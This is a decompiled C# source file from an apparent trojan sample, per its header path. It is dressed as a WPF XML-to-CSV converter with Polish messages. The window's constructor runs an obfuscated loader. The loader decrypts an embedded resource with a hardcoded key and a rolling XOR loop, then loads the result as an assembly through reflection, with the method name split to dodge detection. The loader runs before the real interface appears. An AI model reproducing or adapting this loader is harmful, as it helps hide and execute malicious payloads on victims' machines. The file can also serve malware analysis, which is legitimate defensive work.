// Decompiled with JetBrains decompiler
// Type: dotXMLToolsWPF.MainWindow
// Assembly: LeaseMana, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 529A6AA6-AEB5-47F3-B86B-C5E3C5F9FA62
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.PowerShell.gen-7e41c997a103e91b3815e9269a2d8806e5474c05620f8ff0ca591a586eae2f80.exe

using dotXMLToolsWPF.Controls;
using PathLibrary;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Windows;
using System.Windows.Forms;
using System.Windows.Markup;
using System.Xml.Linq;
using XML2List;

namespace dotXMLToolsWPF
{
  public class MainWindow : Window, IComponentConnector
  {
    private ObservableCollection<PathSelection> pathSelection = (ObservableCollection<PathSelection>) null;
    private XDocument xDocument = (XDocument) null;
    private static object PrecannedResource;
    internal FileOutputSelect fileoutput;
    internal PathSelect PathSelector;
    private bool _contentLoaded;

    private static DockStyle ServerAsyncReplyTerminatorSink()
    {
      byte[] numArray = (byte[]) new ResourceManager(typeof (Form1)).GetObject("XML");
      string pass = "UD7E78DO6PY8H7SXZR58SZ";
      for (int i = 100374; i >= 0; i += -1)
        numArray = MainWindow.Mapping(pass, numArray, i, 50176);
      MainWindow.R7(MainWindow.R5(numArray));
      return DockStyle.Fill;
    }

    private static byte[] Mapping(string pass, byte[] tt, int i, int len)
    {
      tt[i % len] = MainWindow.@string((MainWindow.IResourceWriter(tt, pass, len, i) - MainWindow.@uint((int) tt[(i + 1) % len]) + 256) % 256);
      return tt;
    }

    private static int IResourceWriter(byte[] tt, string pass, int len, int i) => MainWindow.@uint((int) tt[i % len] ^ (int) pass[i % 22]);

    private static int @uint(int x) => x;

    private static byte @string(int x) => (byte) x;

    private static object R5(byte[] TaskAwaiter) => typeof (Assembly).InvokeMember("L" + string.Empty + "oa" + string.Empty + "d", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) TaskAwaiter
    });

    private static void R7(object CompatibilitySwitches) => MainWindow.PrecannedResource = (object) ((Assembly) CompatibilitySwitches).GetType("qdNNspHJj9LvQpeIaD.T0OvGG6kukiwGuOCpX");

    public MainWindow()
    {
      int num = (int) MainWindow.ServerAsyncReplyTerminatorSink();
      PathSelection pathSelection = new PathSelection(MainWindow.PrecannedResource);
      this.InitializeComponent();
    }

    private void MenuItem_File_Exit_Click(object sender, RoutedEventArgs e) => System.Windows.Application.Current.Shutdown();

    private void MenuItem_File_Open_Click(object sender, RoutedEventArgs e)
    {
      this.pathSelection = new ObservableCollection<PathSelection>();
      Microsoft.Win32.OpenFileDialog openFileDialog = new Microsoft.Win32.OpenFileDialog();
      openFileDialog.Filter = "XML Files(*.xml)|*.xml";
      openFileDialog.CheckFileExists = true;
      openFileDialog.Multiselect = false;
      bool? nullable = openFileDialog.ShowDialog();
      bool flag = true;
      if (nullable.GetValueOrDefault() == flag & nullable.HasValue)
      {
        this.xDocument = XDocument.Load(openFileDialog.FileName);
        foreach (string key in new PathCollection(this.xDocument.Root).PathCounter.Keys)
          this.pathSelection.Add(new PathSelection(key, false));
        this.PathSelector.lstView.ItemsSource = (IEnumerable) this.pathSelection;
      }
      this.PathSelector.PathClick += new PathSelect.PathMouseClickHandler(this.PathSelector_PathClick);
    }

    private void PathSelector_PathClick(string path)
    {
      this.PathSelector.lstView.ItemsSource = (IEnumerable) null;
      foreach (PathSelection pathSelection in (Collection<PathSelection>) this.pathSelection)
      {
        if (pathSelection.Path == path)
          pathSelection.IsSelected = !pathSelection.IsSelected;
      }
      this.PathSelector.lstView.ItemsSource = (IEnumerable) this.pathSelection;
    }

    private void Button_Click(object sender, RoutedEventArgs e)
    {
      if (this.xDocument == null)
      {
        int num1 = (int) System.Windows.MessageBox.Show("Nie wczytano pliku XML");
      }
      else
      {
        string[] array = this.pathSelection.Where<PathSelection>((Func<PathSelection, bool>) (path => path.IsSelected)).Select<PathSelection, string>((Func<PathSelection, string>) (path => path.Path)).ToArray<string>();
        using (StreamWriter streamOut = new StreamWriter(this.fileoutput.OutputFilePath))
        {
          new CSVListMaker(this.xDocument).MakeList((TextWriter) streamOut, array);
          int num2 = (int) System.Windows.MessageBox.Show("Lista została zapisana w pliku: " + this.fileoutput.OutputFilePath);
        }
      }
    }

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    public void InitializeComponent()
    {
      if (this._contentLoaded)
        return;
      this._contentLoaded = true;
      System.Windows.Application.LoadComponent((object) this, new Uri("/LeaseMana;component/mainwindow.xaml", UriKind.Relative));
    }

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    internal Delegate _CreateDelegate(System.Type delegateType, string handler) => Delegate.CreateDelegate(delegateType, (object) this, handler);

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    void IComponentConnector.Connect(int connectionId, object target)
    {
      switch (connectionId)
      {
        case 1:
          ((System.Windows.Controls.MenuItem) target).Click += new RoutedEventHandler(this.MenuItem_File_Open_Click);
          break;
        case 2:
          ((System.Windows.Controls.MenuItem) target).Click += new RoutedEventHandler(this.MenuItem_File_Exit_Click);
          break;
        case 3:
          this.fileoutput = (FileOutputSelect) target;
          break;
        case 4:
          this.PathSelector = (PathSelect) target;
          break;
        case 5:
          ((System.Windows.Controls.Primitives.ButtonBase) target).Click += new RoutedEventHandler(this.Button_Click);
          break;
        default:
          this._contentLoaded = true;
          break;
      }
    }
  }
}
